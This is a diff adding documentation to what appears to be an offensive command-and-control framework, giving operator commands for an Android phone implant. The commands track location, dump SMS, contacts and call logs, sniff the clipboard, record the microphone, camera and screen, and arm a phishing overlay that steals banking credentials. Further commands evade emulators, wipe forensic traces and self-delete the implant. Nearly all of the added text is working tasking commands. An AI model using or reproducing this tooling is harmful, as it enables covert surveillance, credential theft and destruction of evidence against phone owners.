@@ -1080,6 +1080,81 @@ The answers are the truth of the phone: a task that could not be done says
 so instead of pretending that nothing happened, and the operator sees
 whether the window accepted the action.
 
+### The senses of the phone
+
+A phone answers seventeen tasks that a workstation cannot answer, and
+every one of them asks the user of the phone for a permission.  The
+guide of the host says which of them are granted:
+
+```bash
+umbra guide phone-01                       # the steps and the permissions
+umbra guide phone-01 --step permissions    # the screen of the permissions
+```
+
+The place of the phone, the networks around it and the people in it:
+
+```bash
+umbra task phone-01 --kind gps.locate      # the fix and the last known position
+umbra task phone-01 --kind wifi.dump       # the networks around the phone
+umbra task phone-01 --kind bluetooth.scan  # the devices around the phone
+umbra task phone-01 --kind contacts.dump   # the address book
+umbra task phone-01 --kind sms.dump        # the messages of the phone
+umbra task phone-01 --kind call.logs       # the call log
+```
+
+The watchers wait for the phone to have something to say.  The queue is
+durable and the phone connects again the moment something arrives, so the
+operator polls it and reads the answer right away:
+
+```bash
+umbra task phone-01 --kind sms.watch --args '{"action":"start"}'
+umbra task phone-01 --kind sms.watch --args '{"action":"poll"}'
+umbra task phone-01 --kind clipboard.sniff --args '{"action":"start"}'
+umbra task phone-01 --kind clipboard.sniff --args '{"action":"poll"}'
+```
+
+The ears and the eyes of the phone.  The capture is a file on the phone
+and the operator pulls it with the ordinary `download` task:
+
+```bash
+umbra task phone-01 --kind media.mic --args '{"seconds":30}'
+umbra task phone-01 --kind media.camera --args '{"facing":"back"}'
+umbra task phone-01 --kind download --args '{"path":"/data/user/0/io.umbra.beacon/files/mic-1730000000000.m4a"}'
+```
+
+The screen of the phone.  The user has to press the button of the system
+dialog, every time the capture starts:
+
+```bash
+umbra task phone-01 --kind live.screen --args '{"action":"request"}'   # the user presses it
+umbra task phone-01 --kind live.screen --args '{"action":"capture"}'
+umbra task phone-01 --kind ui.stream --args '{"action":"start","fps":1}'
+umbra task phone-01 --kind ui.stream --args '{"action":"frames","count":5}'
+```
+
+The false screen of the phone.  The overlay waits for the application the
+operator named and draws the form over it:
+
+```bash
+umbra task phone-01 --kind phish.overlay --args '{"action":"arm","package":"com.example.bank","title":"Sign in","prompt":"Please sign in to continue","fields":["username","password"]}'
+umbra task phone-01 --kind phish.overlay --args '{"action":"dismiss"}'
+```
+
+The laboratory, the databases and the end of the engagement:
+
+```bash
+umbra task phone-01 --kind emulator.detect        # is this a real phone?
+umbra task phone-01 --kind app.dump --args '{"package":"com.example.chat"}'
+umbra task phone-01 --kind anti.forensic          # the material of the engagement goes
+umbra task phone-01 --kind evade.suicide          # the implant leaves the phone
+```
+
+What the operator gets from these tasks is the truth of the phone,
+including the parts the platform refused: a permission that was not
+granted is reported as such, the call log of a phone that is not the
+default dialler says so, and the capture of the screen says that the
+user has to press the button of the system dialog.
+
 ### The mac is a first-class target
 
 The Rust implant carries the whole catalogue on a mac, and the things that
